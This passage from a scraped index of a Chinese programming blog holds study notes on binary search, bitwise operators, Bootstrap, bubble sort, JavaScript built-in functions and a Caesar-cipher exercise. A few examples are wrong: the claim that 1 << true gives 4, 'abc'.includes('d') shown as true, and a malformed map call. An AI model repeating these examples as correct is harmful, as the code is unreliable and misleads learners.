88, 99, 101]target: 25start: 3 end: 2 =&gt; 到此為止，左邊界超出右邊界result: -1 補充一這裡要注意一點，(start &gt; end) 不可以是 &gt;=，要不然會漏掉一個搜尋： 12345678910111213141516171819第一輪array: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 0 end: 7middle: 3 number: 33第二輪array: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 0 end: 2middle: 1 number: 3第三輪array: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 2 end: 2 =&gt; 到此為止，左邊界超出右邊界result: -1(middle: 2 number: 24) =&gt; 還沒有被搜尋到就 return -1 了 補充二binarySearchRecursively(array, targetElement, 0, array.length-1) 中的 array.length - 1 不可以改寫成 array.length。 假設要找的數字是 101，最後就會去找 array[length] 這個數字，但這已經超出 array 的範圍了，所以會得到 undefined。這顯然不是件很好的事情，如果換個程式語言有可能就會直接噴 error，或是回傳一個奇怪的答案： 1234567891011121314151617181920212223242526272829第一輪array: [1, 3, 24, 33, 57, 88, 99, 101]target: 102start: 0 end: 8middle: 4 number: 57第二輪array: [1, 3, 24, 33, 57, 88, 99, 101]target: 102start: 5 end: 8middle: 6 number: 99第三輪array: [1, 3, 24, 33, 57, 88, 99, 101]target: 102start: 7 end: 8middle: 7 number: 101第四輪array: [1, 3, 24, 33, 57, 88, 99, 101]target: 102start: 8 end: 8middle: 8 number: undefined =&gt; 這裡很危險！第五輪array: [1, 3, 24, 33, 57, 88, 99, 101]target: 102start: 8 end: 7value: -1 =&gt; 雖然最後還是能得到正確結果 實作－迴圈迭代法12345678910111213141516171819202122232425262728293031323334function binarySearch(array, targetElement) { // 初始值：0 ~ array 的長度 -1 let start = 0 let end = array.length - 1 // 終止條件 左邊界 &lt;= 右邊界 while (start &lt;= end) { // 中間位置（無條件捨去，取偏左邊那點） const middle = start + end &gt;&gt; 1 console.log('array:', array) console.log('target:', targetElement) console.log('start:', start, 'end:', end) console.log('middle:', middle, 'number:', array[middle]) /* 目標 = 中間那個數字： 找到數字了，直接回傳位置 目標 &gt; 中間的數字： 代表前面的數字不用看了，把 start 設為中間位置往右移一位（+1） 目標 &lt; 中間的數字： 代表後面的數字不用看了，把 end 設為中間位置往左移一位（-1） */ if (targetElement === array[middle]) { return middle } else if (targetElement &gt; array[middle]) { start = middle + 1 } else { end = middle - 1 } } // 找不到目標數字，回傳 -1 return -1} 詳細步驟（跟剛剛差不多）： 123456789101112131415161718第一輪array: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 0 end: 7middle: 3 number: 33第二輪array: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 0 end: 2middle: 1 number: 3第三輪array: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 2 end: 2middle: 2 number: 24value: -1 補充這裡一樣要注意 While (start &lt;= end) 不可以寫成是 &lt;，不然會忽略掉一個搜尋： （兩者差別在於，遞迴是「= 時不能跳掉」，這裡是「= 要再找一次」） 12345678910111213141516171819第一輪array: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 0 end: 7middle: 3 number: 33第二輪array: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 0 end: 2middle: 1 number: 3return -1 =&gt; 下一圈不會執行，所以這圈結束就會 return -1下一圈（如果有執行的話）：array: [1, 3, 24, 33, 57, 88, 99, 101]target: 25start: 2 end: 2middle: 2 number: 24value: -1 哪個方法比較好？根據別人的說法是這樣： 在實作程式的時候，應該要避免使用遞迴(Recursive)的結構，因為遞迴需要不斷地重新建構函數的堆疊空間，硬體資源的負擔會比較大，且若是遞迴層數過多還會導致堆疊溢出(Stack Overflow)。所以比較好的做法還是在一個函數內以迴圈迭代的方式來完成。","link":"/2022/01/18/binary-search/"},{"title":"很有趣的位移運算子與位元運算","text":"原來寫程式還可以這樣子操作。 位元的概念首先，電腦是用「位元」來當作單位，也就是二進位的 0 跟 1，所以這裡提的位元，就是指「二進位」數字的意思。 位移運算子位移運算子是對「位元」來做位移，在效能上會比你直接用加減乘除那些來的好（畢竟電腦的最底層就是一堆 0101），所以這是一個很值得學的東西。 如果忘記二進位怎麼轉換的話先幫你複習一下： 假設有一個數字是 100 用數學來寫的話會是：2^0 x 0 + 2^1 x 0 + 2^2 x 1 = 4 但因為如果是 0 的話就等於 2^n x 0，所以你看的時候可以直接忽略，直接思考「有值的那一個位數」是多少次方就好，這樣比較快： 0100 = 2^2 = 41000 = 2^3 = 810000 = 2^4 = 16 位移運算的意思是就是「先把這個數字轉換成二進位」，接著把每一位往「左或右」位移，後面補 0： 124 &lt;&lt; 1 8 上面的過程可以想成是這樣： 12344 =&gt; 0100 轉成二進位0100 &lt;&lt; 1 每一位往左移一位1000 接著轉回十進位8 因為在二進位裡，每進一位就代表 x2，所以 4 往左位移一位，就等於 4 x 2，得到 8。 如果 4 往左移兩位，就等於 4 x 2 x 2，得到 16，以此類推。 所以有一個很直覺又簡單的記法： 2 &lt;&lt; 1 看成是 2 x 2^1 = 42 &lt;&lt; 2 看成是 2 x 2^2 = 82 &lt;&lt; 3 看成是 2 x 2^3 = 16 總而言之，位移幾次 2 就乘幾次，接著在乘上原本的數字，以此類推。 如果是往右移的話就反過來，變成「除法」的意思，每往右移一位，就除以 2 一次，但要注意的是右移運算會省略掉「浮點數」： 123453/21.53 &gt;&gt; 11 位元運算位元運算子： &amp;（AND） |（OR） ^（XOR） ~（NOT） 位元運算指的就是用「二進位來做運算」，參考這個圖： 意思是對 10 跟 15 做 &amp; 位元運算（AND），1 代表 true，0 代表 false。 所以最後的結果是 1010，也就是 10 用 JavaScript 寫的結果： 1210 &amp; 1510 |（OR）也是一樣的道理： 1210 | 1515 比較特別的是 XOR 跟 NOT。 ^（XOR）是只有在 01 跟 10 的時候是 true，其他皆 false： 所以用 JavaScript 寫的結果是： 1210 ^ 155 ~（NOT）是把每個位元都做反向處理。 不過要注意一下，以剛剛的例子 15(1111) 你可能以為做完會變成 0(0000)，但並不是這樣子： 12~15 -16 這是因為 NOT 是對「所有位元」都做反轉，所以不能只看 1111 這四個位元，因為可能還有其他位元（假設有 32 位元好了）也跟著被反轉，所以最後才會得到 -16。 用位元運算來判斷偶數奇數先思考這張圖的意思： 意思是說我們只想知道最後一個數字是 0 還是 1。 這樣子做有什麼用途？仔細想想看，在二進位的世界裡，只有「最後一個位元」能決定一個數字是奇數還是偶數，其他位元只會有可能是 0 或 2 的倍數，換句話說就是「其他位元只會產出偶數」。 但是最後一個位元不一樣，他會有 0 或 1 這兩個可能。所以重點來了，當結果是 0 的時候，最後的結果一定會是 偶數，因為「偶數 + 偶數」永遠都只會是偶數；反過來，當結果是 1 的時候，最後的結果一定會是 奇數，因為「偶數 + 奇數」永遠都會是奇數。 所以我可以直接驗證： 1234510&amp;1011&amp;11 用位元運算來當作遮罩我還不太懂這能怎麼運用，但就先記下來，看以後會不會想到。 簡單來說，前面是用： A &amp; 1 來判斷最後一位數是不是 1。 你也可以換個想法，假設我想看第四個位元是不是 1，就可以用 A &amp; 8（8=1000）來做判斷。 0 就代表第四位不是 1，1 就代表第四位是 1。 當位元運算碰到奇怪的資料型態我做題目時發生的經驗，想留個紀錄。 我在用「變數」來做位元運算時，因為不確定這個變數值都跟我預期中的一樣，所以引發了一些非預期的結果，例如： 1234567n = undefinedn = NaNn = nulln = 'String'n = false1 &lt;&lt; n 不管 n 的值是哪個，最後的輸出都會是 1，所以在做位元運算時要特別注意「變數值」的是否正確問題，要不然直接帶「數字」來做會比較安全一點。 另外如果 n = true 的情況比較特別一點： 12n = true1 &lt;&lt; n 結果會是 4。 這是因為 true 代表 1，所以想成是這樣： 12n = true1 &lt;&lt; 1 甚至要這樣玩也可以： 11 &lt;&lt; true + true + true 最後就會輸出 1 &lt;&lt; 3 的結果。 位元運算的執行順序就跟一般的加減乘除一樣，所以不用特別在用括號括起來： 1231 &gt;&gt; 2 &gt; 3 // true1 + 1 &gt; 3 // false1 ** 2 &gt; 2 //false","link":"/2021/12/16/bitwise/"},{"title":"Bootstrap 客製化","text":"研究了一段時間才弄出來，筆記一下。 簡述這邊拿 utilities 來舉例。比如說預設的 width 是沒有支援 breakpoint 修飾詞的： w-sm-100 w-md-75 w-lg-50 但如果我希望有這個功能呢？留到下面說明！ 作法首先去下載 Bootstrap 的源碼：Source files。 接著到 scss 資料夾裡面找出要改的地方，這邊是 _utilities： 12345678910111213141516171819D:.├───scss│ │ bootstrap-grid.scss│ │ bootstrap-reboot.scss│ │ bootstrap-utilities.scss│ │ bootstrap.scss│ │ _accordion.scss│ │ _alert.scss│ │ _badge.scss│ │ _breadcrumb.scss│ │ _button-group.scss│ │ _buttons.scss│ │ │ │ .... 略│ │ │ │ _transitions.scss│ │ _type.scss│ │ _utilities.scss &lt;- 就是它啦│ │ _variables.scss 接著參考官方提供的 API 說明： property 對應到的 CSS 屬性 values 屬性的 key 跟 value class 自訂前墜字 state 針對 hover 之類的狀態 responsive 分界點開關 其他用不太到所以就不解釋了。 總之呢，我希望 width 也可以有分界點，所以就去 _utilities 找到這段： 1234567891011\"width\": ( property: width, class: w, values: ( 25: 25%, 50: 50%, 75: 75%, 100: 100%, auto: auto )), 可以看到預設沒設定 responsive，所以這裡它加上去： 123456789101112\"width\": ( property: width, responsive: true, class: w, values: ( 25: 25%, 50: 50%, 75: 75%, 100: 100%, auto: auto )), 改完之後，請務必記得： 重新編譯一次 bootstrap.scss 重新編譯一次 bootstrap.scss 重新編譯一次 bootstrap.scss 備註：如果要做成 min.css 的話請記得再拿去壓縮。 接著編譯出來的那隻檔案就是改好的版本了，把它引入 HTML 就能用了： 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;!-- compile 後的檔案 --&gt; &lt;link rel=\"stylesheet\" href=\"my.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"w-sm-100 w-md-75 w-lg-50\"&gt; Lorem ipsum dolor, sit amet consectetur adipisicing elit. Iusto cum quisquam incidunt sint, dolor a eos perferendis ratione. Dicta repellat a in corrupti cupiditate non libero quibusdam sunt labore molestiae? &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 以上，只要把這個搞懂，相信其他部分也不會有太大問題。","link":"/2022/02/19/bootstrap-cusomized/"},{"title":"Bootstrap 隨筆記","text":"邊學邊紀錄。 其他 有自動設定 border-box &lt;img&gt; 自帶 vertical-align: middle container分成 container 跟 container-fluid，前者是根據下圖在不同分界點設定 max-width： 後者就是永遠 100% 寬度。 如果不想設 fluid 但又想針對某些裝置做滿版，可以加上尾綴字： 12345&lt;div class=\"container-sm\"&gt;576px 以下 100%&lt;/div&gt;&lt;div class=\"container-md\"&gt;768px 以下 100%&lt;/div&gt;&lt;div class=\"container-lg\"&gt;992px 以下 100%&lt;/div&gt;&lt;div class=\"container-xl\"&gt;1200px 以下 100%&lt;/div&gt;&lt;div class=\"container-xxl\"&gt;1400px 以下 100%&lt;/div&gt; width / heightwidth w-25 w-50 w-75 w-100 w-auto mw-100 height h-25 h-50 h-75 h-100 h-auto mh-100 min-vh-100 vh-100 border方向borderborder-topborder-endborder-bottomborder-start 寬度border border-1border border-2border border-3border border-4border border-5 圓角roundedrounded-toprounded-endrounded-bottomrounded-startrounded-circlerounded-pill 圓角尺寸rounded-0rounded-1rounded-2rounded-3 display d-flex d-inline-flex d-inline d-inline-block d-block d-grid Text對齊 text-start text-center text-end 粗細fw-boldfw-bolderfw-normalfw-lightfw-lighterfst-italicfst-normal 大小寫 text-lowercase text-uppercase text-capitalize 文字大小 fs-1 fs-2 fs-3 fs-4 fs-5 fs-6 顏色 text-primary text-secondary text-success text-danger text-warning text-info text-light text-dark text-body text-muted text-white text-black-50 text-white-50 Flex方向 flex-row flex-row-reverse flex-column flex-column-reverse 主軸 justify-content-start justify-content-end justify-content-center justify-content-between justify-content-around justify-content-evenly 次軸 align-items-start align-items-end align-items-center align-items-baseline align-items-stretch 子次軸 align-self-start align-self-end align-self-center align-self-baseline align-self-stretch 收縮 / 展開 flex-grow-1 flex-shrink-1 換行 flex-nowrap flex-wrap 順序 order-0 order-1 order-2 order-3 order-4 order-5","link":"/2022/02/17/bootstrap-note/"},{"title":"泡沫排序法（Bubble-sort）","text":"泡沫～ 概念兩兩做比較，如果右邊比左邊大就換位置，最後在最右邊的數字就是「最大值」。 因為很像泡泡一樣往上飄，故得到「泡沫排序法」這個名稱。 流程圖： 步驟12345678910111213let swapped = nulllet sortedCounter = 0let total = array.lengthdo swapped = false let unsortedNumberCount = total - sortedCounter for i 1 to unsortedNumberCount-1 if leftElement &gt; rightElement swap(leftElement, rightElement) swapped = true end for swappCount++while swapped 1234567891011121314令 swapped = null（一個 flag，判斷是否排序完畢）令 sortedCounter = 0（計算已經有幾個數字排序完畢）令 total = array.length（全部有幾個數字）do swapped = false （設定 flag 初始值，如果沒被更新就不會有下一圈） 令 unsortedNumberCount = 尚未排序的數字數量 遍歷 1 到 unsortedNumberCount - 1 如果左邊數字 &gt; 右邊數字 把兩個數字交換 swapped = true（設定 flag，代表還沒排序完畢） 迴圈結束 sortedCounter++（更新已排序數量）while swapped 實作123456789101112131415161718192021222324252627282930313233343536373839404142434445464748function bubbleSort(arr) { // 判斷用的 flag let swapped = null // 已經排序好的數量 let sortedCounter = 0 // 總數 let total = arr.length // 排序 do { // 設定 flag 初始值 swapped = false // 未排序的數字總數 const unsortedNumberCount = total - sortedCounter // 第一次遍歷： i from 0 to 18 // 第二次遍歷： i from 0 to 17 for (let i=0; i&lt;unsortedNumberCount-1; i++) { // 左邊 &gt; 右邊就交換位置 if (arr[i] &gt; arr[i+1]) { let temp = arr[i] arr[i] = arr[i+1] arr[i+1] = temp // 更新 flag，代表要在跑一次迴圈 swapped = true } } // 已排序好的數量 + 1 sortedCounter++ } while (swapped) // 回傳結果 return arr}/* 比較不同的排序法： bubble: 13 次迴圈 selectionSort 20 次迴圈*/const numbers = [5, 44, 23, 3, 42, 4, 2, 29, 3, 16, 3, 48, 35, 44, 23, 24, 20, 45, 26, 6]console.log(bubbleSort(numbers))/* [ 2, 3, 3, 3, 4, 5, 6, 16, 20, 23, 23, 24, 26, 29, 35, 42, 44, 44, 45, 48 ]*/","link":"/2022/01/17/bubble-sort/"},{"title":"陣列的內建函式","text":"常用的內建函式。 不改變原本陣列的方法Array.some(function) 是否有一個元素符合函式的內容 123const array = [2, 4, 5, 7, 10];console.log(array.some(x =&gt; x &gt; 5)) // trueconsole.log(array.some(x =&gt; x &lt; 0)) // false Array.every(function) 是否所有元素皆符合函式的內容 123const array = [2, 4, 5, 7, 10];console.log(array.every(x =&gt; x &gt; 0)) // trueconsole.log(array.every(x =&gt; x % 2 === 0)) // false Array.concat(array) 把兩個陣列合併起來後回傳。 1234const arr1 = [1, 2, 3]const arr2 = [4, 5, 6]const arr3 = arr1.concat(arr2)console.log(arr3) // [1, 2, 3, 4, 5, 6] Array.join(separator) 在每個元素之間插入 separator，結合成一個字串回傳。 12345const str = 'AbCdEFGhijkLMN'const arr = str.split('')let result = arr.join('，')console.log(result)// A，b，C，d，E，F，G，h，i，j，k，L，M，N Array.slice(start, end) =&gt; 切出陣列的某個部分。根據指定的起始與終點索引值（不包含 end）。 小技巧： 不指定 end 的話會自動算到最後一個元素 輸入負數代表「從後面數來第 n 個字」 1234567const arr = [1, 2, 3, 4, 5]const result1 = arr.slice(0, 4)const result2 = arr.slice(2)const result3 = arr.slice(0, -3)console.log(result1) // [1, 2, 3, 4]console.log(result2) // [3, 4, 5]console.log(result3) // [1, 2] Array.reduce(function, accumulator) 回傳陣列總和加上 accumulator 的值 補充：每一圈的 accumulator 值 = 上一圈的回傳值 12345const arr = [1, 2, 3]const result = arr.reduce(function(acc, elem) { return acc + elem}, 20)console.log(result) // 6 + 20 = 26 小技巧：把 accumulator 的值設為 0（不設值也可以，但不建議這樣做），等於算出「陣列總和」 （沒有指定 accumulator 時，function 會把陣列的第一個元素當作累加器，並且忽略第一個元素，所以才會變成陣列總和） 12345const arr = [1, 2, 3]const result = arr.reduce(function(acc, elem) { return acc + elem})console.log(result) // 6 乘法也是一樣的概念： 12345const arr = [1, 2, 3]const result = arr.reduce(function(acc, elem) { return acc * elem}, 10)console.log(result) // 6 * 10 = 60 Array.find(function) 回傳第一個在 function 中回傳 true 的元素 12345const arr = [1, 2, 3, 5, 10, 7]const result = arr.find(function (element) { return element &gt; 3})console.log(result) // 5 Array.some(function) 只要有一個元素通過 function 檢查就回傳 true，否則回傳 false 12345const arr = [1, 2, 3, 5, 10, 7]const hasEven = arr.some(function (element) { return element % 2 === 0})console.log(hasEven) Array.findIndex(function) 回傳第一個在 function 中回傳 true 的元素的索引值 12345const arr = [1, 2, 3, 5, 10, 7]const result = arr.findIndex(function (element) { return element &gt; 3})console.log(result) // 3 Array.includes(value) 判斷 value 是否包含在 Array 裡面，是就回傳 true，不是就回傳 false 12345const arr = [1, 2, 3]console.log(arr.includes(1)) // trueconsole.log(arr.includes(2)) // trueconsole.log(arr.includes(3)) // trueconsole.log(arr.includes(4)) // false Array.forEach(function) 在 function 中對每個元素做一段處理。 注意：這個方法不會有回傳值，所以當成是 for 迴圈的語法糖就好了 123456const arr = [1, 2, 3]const response = arr.forEach(elem =&gt; console.log(elem)) // output: 1 // output: 2 // output: 3// output: undefined (response 的值) Array.map(function) 在 function 中對每個元素做一段處理，再利用該 function 的回傳值來建立一個新陣列。 12345const arr = [1, 2, 3]const result = arr.map(function (element) { return element * 2})console.log(result) // [2, 4, 6] 小技巧：轉換資料型態時很適合用 map 123const arr =['1', '2', '3']const result = arr.map(elem) =&gt; Number(elem))console.log(result) // [1, 2, 3] 後來發現其實還有更簡單的做法： 123const arr =['1', '2', '3']const result = arr.map(Number)console.log(result) // [1, 2, 3] 如果你想用「命名函式」來當作要傳入的 function 也可以： 12345678910var arr = [1, 2, 3, 4]var result = arr.map(handler)console.log(result) // [ 1, 32, 243, 1024 ]function double(x, y) { return x ** y}function handler (element) { return double(element, 5)} Array.filter(function) =&gt; 在 function 中對每個元素做條件判斷，根據該 function 的回傳值來建立一個新陣列。 true 會留下，false 會被遺棄（只留下奇數）： 12345const arr = [1, 2, 3]const result = arr.filter(function (element) { return element &amp; 1})console.log(result) // [1, 3] Array 方法串燒如果回傳值是一個 Array，就可以一直使用 Array 的方法來串接下去。 用 map() 來做串燒： 12345678910var arr = [1, 2, 3]var result = arr .map(function(element) { return element * 2 }) .map(function(element) { return element + 'yo' })console.log(result) // [ '2yo', '4yo', '6yo' ] 你要混搭 map()，filter() 也可以，但請務必確認前一個的回傳值是 Array。 會改變原本陣列的方法再次強調，以下方法都會改變原本的陣列！ Array.reverse() 反轉陣列 要注意回傳值也是一個反轉後的陣列： 1234const array1 = [1, 2, 3]const array2 = array1.reverse()console.log(array1) // [3, 2, 1]console.log(array2) // [3, 2, 1] Array.fill(value, start, end) 以某個值填滿陣列 要注意回傳值也是一個填滿後的陣列： 12345const array1 = [1, 2, 3, 4]const array2 = array1.fill('A')console.log(array1) // ['A', 'A', 'A', 'A']console.log(array2) // ['A', 'A', 'A', 'A'] 小技巧： 不指定 end 的話會自動算到最後一個元素 輸入負數代表「從後面數來第 n 個字」 123456const array1 = [1, 2, 3, 4]const array2 = [1, 2, 3, 4]const array3 = array1.fill('A', 1)const array4 = array2.fill('A', 0, -2)console.log(array3) // [1, 'A', 'A', 'A']console.log(array4) // ['A', 'A', 3, 4] Array.splice(start, delete, add) 插入或刪除元素 123const arr = [1, 2, 3, 4, 5]arr.splice(1, 1, 'Yo', 'DJ')console.log(arr) // [1, 'Yo', 'DJ', 3, 4, 5] 意思是：「從第 1 個索引位置，刪除一個元素，新增 Yo、DJ 這兩個元素」 Array.sort(a, b) 對元素做排序 預設的排序方式預設是根據「Unicode」的號碼來做排序（由小排到大），但我覺得這樣記也蠻方便的： 按照第一個「英文」字母排序（小寫的 Unicode 比大寫大） 按照第一個「數字」排序 123const arr = ['gGsdkfi', 'COKAOS', 'aAdjaod', 'Dkapd', 'Bkoad']arr.sort()console.log(arr) // [ 'Bkoad', 'COKAOS', 'Dkapd', 'aAdjaod', 'gGsdkfi' ] 123const arr = [24, 13, 66, 45, 86, 27, 55]arr.sort()console.log(arr) // [13, 24, 27, 45, 55, 66, 86] 自定義排序方式根據 return 值來決定排序方式，詳細規則可以參考 MDN，這裡只寫比較方便的記法： 假設初始的排序是 a =&gt; b return 正數 代表 a b 交換位置 return 負數 代表 a b 不交換位置 所以如果要由小排到大： 123456const arr = [24, 13, 66, 45, 86, 27, 55]arr.sort(function(a, b) { if(a &gt; b) return 1 if(a &lt; b) return -1})console.log(arr) // [13, 24, 27, 45, 55, 66, 86] 如果要由大排到小： 123456const arr = [24, 13, 66, 45, 86, 27, 55]arr.sort(function(a, b) { if(a &gt; b) return -1 if(a &lt; b) return 1})console.log(arr) // [86, 66, 55, 45, 27, 24, 13] 更簡潔的寫法： 12345const arr = [24, 13, 66, 45, 86, 27, 55]arr.sort(function(a, b) { return a - b})console.log(arr) // [13, 24, 27, 45, 55, 66, 86] 解釋一下，如果 a-b 得到 正數，代表 a 比 b 大 的時候交換位置。可以想成是「碰到大的就交換位置」，所以小的都會被排到後面，最後得到「由小到大」的排序。 12345const arr = [24, 13, 66, 45, 86, 27, 55]arr.sort(function(a, b) { return b - a})console.log(arr) // [86, 66, 55, 45, 27, 24, 13] 解釋一下，如果 b-a 得到 正數，代表 a 比 b 小 的時候交換位置。可以想成是「碰到小的就交換位置」，所以大的都會被排到後面，最後得到「由小到大」的排序。 Array.push(element1, [element2, [element3, ...]]) 新增元素到陣列結尾 補充：回傳值為新的陣列長度 123const arr = [1, 2]console.log(arr.push(3, 4)) // 4console.log(arr) // [1, 2, 3, 4] Array.pop() 移除陣列的最後一個元素 補充：回傳值為被移除的元素 123const arr = [1, 2, 3, 4]console.log(arr.pop()) // 4console.log(arr) // [1, 2, 3] Array.unshift(element1, [element2, [element3, ...]]) 新增元素到陣列開頭 補充：回傳值為新的陣列長度 123const arr = [3, 4]console.log(arr.unshift(1, 2)) // 4console.log(arr) // [1, 2, 3, 4] Array.shift() 移除陣列的第一個元素 補充：回傳值為被移除的元素 123const arr = [1, 2, 3, 4]console.log(arr.shift()) // 1console.log(arr) // [2, 3, 4]","link":"/2021/12/20/built-in-function-array/"},{"title":"跟數字有關的內建函式","text":"常用的內建函式。 Number補充：大寫的屬性名稱代表這個數字是一個「常數（Constant）」，也就不會改變得數字。 Number.parseInt(str, base) parseInt(str, base) 根據指定的進位方式，把字串轉成數字 Number.parseFloat(n) 把字串轉成浮點數，通常用在做浮點運算的情況 Number.toFixed() 四捨五入到小數第幾位，注意回傳值是 string 123const numberA = 0.123456console.log(numberA.toFixed(2))console.log(numberA.toFixed(4)) Number.MAX_VALUE 在 JavaScript 中可以儲存的最大數字 Number.MIN_VALUE 在 JavaScript 中可以儲存的最小數字 Math.ceil(n) 無條件進位，取整數 Math.floor(n) 無條件捨去，取整數 Math.round(n) 四捨五入，取整數 Math.sqrt(n) 開根號 Math.pow(n, e) 次方 Math.abs(n) 絕對值 Math.random() 隨機產生 0 ~ 0.99999999 Math.max(1,2,3) 找出數字中的最大值 random 的使用方式以前還蠻不清楚這個的用法的，所以寫下來提醒自己，其實只要從最原始的範圍下去思考就好懂多了： 0 ~ 0.99999999，以這個範圍去思考想要產生的範圍。 假設想產生 0~9 的數字 =&gt; 0 ~ 9.99999999 要達到這個範圍，得將原本的範圍 x 10： 1Math.random() * 10 假設想產生 1~10 的數字 =&gt; 1 ~ 10.99999999 要達到這個範圍，得將原本的範圍 x 10，接著 + 1： 1Math.random() * 10 + 1 不想要小數點的話，可以用 Math.floor() 來無條件捨去： 1Math.floor(Math.random() * 10 + 1) 把數字轉換成貨幣可以用 toLocaleString 這個方法來實現，還蠻方便的： 123456const total = 13.5;const localeString = total.toLocaleString('en', { style: 'currency', currency: 'TWD'});console.log(localeString); // NT$13.50","link":"/2021/12/20/built-in-function-numbers/"},{"title":"跟字串有關的內建函式","text":"常用到的內建函式。 StringString.charCodeAt(n) 第 n 個字元儲存的 ASCII 碼 1234const str = 'abc'console.log(str.charCodeAt(0)) // 97console.log(str.charCodeAt(1)) // 98console.log(str.charCodeAt(2)) // 99 String.FromCharCode(n) 轉換成對應的字元（n = ASCII） 123456const ASCII1 = 97const ASCII2 = 98const ASCII3 = 99console.log(String.fromCharCode(ASCII1)) // aconsole.log(String.fromCharCode(ASCII2)) // bconsole.log(String.fromCharCode(ASCII3)) // c String.toUpperCase(str) 字串轉大寫String.toLowerCase(str) 字串轉小寫 「非英文字母」的字元不會做轉換。 123456const Upper = 'abc'.toUpperCase()const Lower = 'ABC'.toLowerCase()const NotEn = '@123'.toUpperCase()console.log(Upper) // ABCconsole.log(Lower) // abcconsole.log(NotEn) // @123 String.endsWith(string) 結尾字串跟 string 相不相同。 1234567const str = 'abc'console.log(str.endsWith('c')) // trueconsole.log(str.endsWith('bc')) // trueconsole.log(str.endsWith('abc')) // trueconsole.log(str.endsWith('abc ')) // falseconsole.log(str.endsWith(' abc')) // falseconsole.log(str.endsWith('')) // true String.padEnd(string, targetLength, padSting) 把填充文字塞到原字串，直到結果長度為止 補充： 如果沒有填充文字，自動以「空格」來代替 如果填充文字為「空字串」，回傳原字串 如果「結果長度 &lt;= 原字串長度」，回傳原字串 123456const str = 'abc'console.log(str.padEnd(10,'a')) // 'abcaaaaaaa'console.log(str.padEnd(10,'dog')) // 'abcdogdogd'console.log(str.padEnd(2,'abbc')) // 'abc'console.log(str.padEnd(10,'')) // 'abc'console.log(str.padEnd(10)) // 'abc ' String.indexOf(string) 搜尋 string 出現位置的索引值（第一個字元），不存在則回傳 -1 1234567const str = 'hello how are you today.'const n1 = str.indexOf('hello')const n2 = str.indexOf('today')const n3 = str.indexOf('tomorrow')console.log(n1) // 0console.log(n2) // 18console.log(n3) // -1 String.includes(str) 看 String 有沒有包含 str，有的話回傳 true，沒有回傳 false 補充： 有分大小寫 在 String 有值的前提下，str 代空字串永遠回傳 true 123456const str = 'abc'console.log(str.includes('a')) // trueconsole.log(str.includes('ab')) // trueconsole.log(str.includes('abc')) // trueconsole.log(str.includes('d')) // trueconsole.log(str.includes('')) // true 小技巧：可以反向操作，判斷傳入的 str 是否「是空字串」 1234const empty = ''// 意思是說 abc 跟 '' 是否在「空字串」裡面？console.log(empty.includes('abc')) // falseconsole.log(empty.includes('')) // true 甚至也可以用 NOT (!) 來判斷傳入的 str 是否「不是空字串」： 1234const empty = ''// 意思是說 abc 跟 '' 是否在「非空字串」裡面？console.log(!(empty).includes('abc')) // trueconsole.log(!(empty).includes('')) // false String.replace(str, replace) 把 str 換成 replace。只會把第一個符合的對象給替換， 123const str = 'yoyoyoyooooyoyyyo'const n1 = str.replace('y', '!')console.log(n1) // !oyoyoyooooyoyyyo 如果要把每個符合的都改掉得用 regExp： 123const str = 'yoyoyoyooooyoyyyo'const n1 = str.replace(/y/g, '!')console.log(n1) // !o!o!o!oooo!o!!!o String.replaceAll(str, replace) 把所有的 str 換成 replace。 123const str = 'yoyoyoyooooyoyyyo'const n1 = str.replaceAll('y', '!')console.log(n1) // !o!o!o!oooo!o!!!o String.split(separator) 對字串分割，回傳一個 Array 123const str = '1y2y3y4y5'const n1 = str.split('y')console.log(n1) // [ '1', '2', '3', '4', '5' ] 注意一下如果 separator 的前面沒有字串，會自動把空字串填入陣列： （因為分割的位置還沒有任何的字元） 123const str = 'yyyy1y2y3y4y5y'const n1 = str.split('y')console.log(n1) // [ '', '', '', '', '1', '2', '3', '4', '5', ''] 另外，separator 也可以是正則表達式： 123const str = 'yo2yoy3oyo1o'const n1 = str.split(/[0-9]/)console.log(n1) // [ 'yo', 'yoy', 'oyo', 'o' ] String.trim 去掉字串頭尾的空格（不管有幾個） 123const str = ' yooooo 'const n1 = str.trim()console.log(n1) // 'yooooo' String.substring(start, end) 回傳指定範圍的字串（不含 end） 補充：跟 slice 的差別在 substring 不可以指定「負值」 小技巧：不指定 end 的話會自動算到最後一個字 12345const str = 'abcdefg'const result1 = str.substring(1, 5)const result2 = str.substring(3)console.log(result1) // bcdeconsole.log(result2) // defg String.slice(start, end) 回傳指定範圍的字串（不含 end） 123const str = 'Today is a good day';console.log(str.slice(0, 5)) // Today console.log(str.slice(6)); // is a good day 小技巧：輸入負數代表「從後面數來第 n 個字」 123const str = 'Today is a good day';console.log(str.slice(0, -4)) // Today is a goodconsole.log(str.slice(-3)) // day","link":"/2021/12/20/built-in-function-string/"},{"title":"放在 form 裡面的 button","text":"跟預設行為有關。 問題如果有個 &lt;form&gt; 裡面放了一個 &lt;button&gt;，會發現按下按鈕時，表單會自動送出。 123&lt;form action=\"http://a.com\"&gt; &lt;button&gt;send&lt;/button&gt;&lt;/form&gt; 原因與解法這是因為如果沒有對 &lt;button&gt; 做 type 的設定的話，預設會設成 type=\"submit\"。 如果不要送出表單的功能，只要指定 type=\"button\" 就不會自動送出了。","link":"/2022/01/06/button-inside-form/"},{"title":"凱薩加密","text":"來自 LIOJ 上的題目，這題實作的東西蠻有趣的，而且這次想到了不同的解法，所以想記錄下來。 解題方向這一題只要把字串轉成對應的 ASCII CODE，再加上位移量就可以做到位移的動作。唯一要注意的是範圍在 97 ~ 122 之間。 所以這一題的難點在於：當位移後的數字超過 122 時怎麼處理？ 解法一 While 迴圈法這種解法應該是比較直覺的想法： 12345678910111213141516171819202122232425function solve(lines) { // 位移量 const n = lines[0] * 1 // 原字串 const str = lines[1] console.log(caesarCipher1(str, n))}function caesarCipher1(s, n) { let result = '' for(let i=0; i&lt;s.length; i++) { // 取得 ASCII CODE const code = s.charCodeAt(i) // 位移後的數字 let m = code + n // 取餘數 + 96 直到 &lt;= 122 為止 while(m &gt; 122) { // 加上 96 是因為 a 從 97 